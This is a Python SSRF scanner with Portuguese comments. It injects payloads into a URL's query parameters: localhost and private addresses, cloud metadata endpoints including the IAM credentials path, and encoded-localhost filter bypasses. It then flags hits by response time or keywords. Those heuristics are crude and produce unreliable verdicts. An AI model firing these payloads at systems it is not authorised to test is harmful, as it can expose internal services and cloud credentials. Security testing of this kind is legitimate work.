#!/usr/bin/env python3
"""
LIBERTUS SSRF DETECTOR

Detecta Server-Side Request Forgery testando:
1. URL parameters
2. Redirect parameters
3. File upload via URL
4. Webhook/callback parameters
5. Internal network access
"""

import asyncio
import aiohttp
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode
import time


class LibertusSSRFDetector:
    """Detector profissional de SSRF"""
    
    def __init__(self):
        # Payloads SSRF
        self.payloads = {
            'internal': [
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'http://internal',
                'http://192.168.1.1',
                'http://10.0.0.1',
            ],
            'cloud_metadata': [
                'http://169.254.169.254/latest/meta-data/',  # AWS
                'http://metadata.google.internal/computeMetadata/v1/',  # GCP
                'http://169.254.169.254/metadata/instance',  # Azure
            ],
            'bypass': [
                'http://127.1',
                'http://0177.0.0.1',  # Octal
                'http://2130706433',  # Decimal
                'http://0x7f.0x0.0x0.0x1',  # Hex
            ]
        }
        
        # Colaborator para detecção out-of-band
        # Em produção, usar Burp Collaborator ou similar
        self.collaborator = "http://example.com/ssrf-detector"
    
    async def test_url(self, url: str) -> List[Dict]:
        """Testa URL para SSRF"""
        
        vulnerabilities = []
        
        print(f"🔍 Testing SSRF: {url}")
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("   ⚠️ Nenhum parâmetro para testar")
            return vulnerabilities
        
        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"   📝 Testing parameter: {param_name}")
            
            # Testa payloads internos
            vuln = await self._test_internal_access(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 SSRF INTERNAL ACCESS!")
            
            # Testa cloud metadata
            vuln = await self._test_cloud_metadata(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 SSRF CLOUD METADATA!")
            
            # Testa bypass
            vuln = await self._test_bypass(url, param_name)
            if vuln:
                vulnerabilities.append(vuln)
                print(f"      💥 SSRF BYPASS DETECTED!")
        
        return vulnerabilities
    
    async def _test_internal_access(self, url: str, param: str) -> Dict:
        """Testa acesso a recursos internos"""
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads['internal']:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    start = time.time()
                    
                    async with session.get(test_url, timeout=10) as resp:
                        elapsed = time.time() - start
                        content = await resp.text()
                        
                        # Indicadores de SSRF bem-sucedido
                        success_indicators = [
                            'connection refused',
                            'could not connect',
                            'unable to connect',
                            'connection timed out',
                            'no route to host',
                            # Respostas internas
                            'apache',
                            'nginx',
                            'iis',
                        ]
                        
                        # Response time suspeito (muito rápido = local)
                        if elapsed < 0.1:
                            return {
                                'type': 'ssrf_internal',
                                'param': param,
                                'payload': payload,
                                'url': url,
                                'evidence': f'Suspiciously fast response: {elapsed:.3f}s',
                                'severity': 'CRITICAL'
                            }
                        
                        # Conteúdo suspeito
                        content_lower = content.lower()
                        for indicator in success_indicators:
                            if indicator in content_lower:
                                return {
                                    'type': 'ssrf_internal',
                                    'param': param,
                                    'payload': payload,
                                    'url': url,
                                    'evidence': f'Found indicator: "{indicator}"',
                                    'severity': 'CRITICAL'
                                }
                
                except asyncio.TimeoutError:
                    # Timeout pode indicar rede interna
                    return {
                        'type': 'ssrf_internal',
                        'param': param,
                        'payload': payload,
                        'url': url,
                        'evidence': 'Timeout - possible internal network access',
                        'severity': 'HIGH'
                    }
                
                except:
                    continue
        
        return None
    
    async def _test_cloud_metadata(self, url: str, param: str) -> Dict:
        """Testa acesso a cloud metadata"""
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads['cloud_metadata']:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    async with session.get(test_url, timeout=5) as resp:
                        content = await resp.text()
                        
                        # Indicadores de metadata
                        metadata_indicators = [
                            'ami-id',
                            'instance-id',
                            'iam/security-credentials',
                            'computeMetadata',
                            'instance/attributes',
                            'subscription',
                        ]
                        
                        content_lower = content.lower()
                        for indicator in metadata_indicators:
                            if indicator in content_lower:
                                return {
                                    'type': 'ssrf_cloud_metadata',
                                    'param': param,
                                    'payload': payload,
                                    'url': url,
                                    'evidence': f'Cloud metadata exposed: "{indicator}"',
                                    'severity': 'CRITICAL',
                                    'impact': 'Can leak AWS/GCP/Azure credentials'
                                }
                
                except:
                    continue
        
        return None
    
    async def _test_bypass(self, url: str, param: str) -> Dict:
        """Testa bypass de filtros"""
        
        async with aiohttp.ClientSession() as session:
            for payload in self.payloads['bypass']:
                test_url = self._inject_payload(url, param, payload)
                
                try:
                    start = time.time()
                    
                    async with session.get(test_url, timeout=5) as resp:
                        elapsed = time.time() - start
                        
                        # Response muito rápido = localhost
                        if elapsed < 0.1:
                            return {
                                'type': 'ssrf_bypass',
                                'param': param,
                                'payload': payload,
                                'url': url,
                                'evidence': f'Filter bypassed - localhost accessed via {payload}',
                                'severity': 'CRITICAL'
                            }
                
                except:
                    continue
        
        return None
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Injeta payload no parâmetro"""
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        return new_url


async def main():
    """Teste"""
    detector = LibertusSSRFDetector()
    
    test_url = "https://example.com/fetch?url=https://google.com"
    
    vulns = await detector.test_url(test_url)
    
    print("\n" + "="*60)
    print(f"✅ SSRF vulnerabilities found: {len(vulns)}")
    
    for vuln in vulns:
        print(f"\n🎯 {vuln['type'].upper()}")
        print(f"   Parameter: {vuln['param']}")
        print(f"   Payload: {vuln['payload']}")
        print(f"   Evidence: {vuln['evidence']}")


if __name__ == "__main__":
    asyncio.run(main())
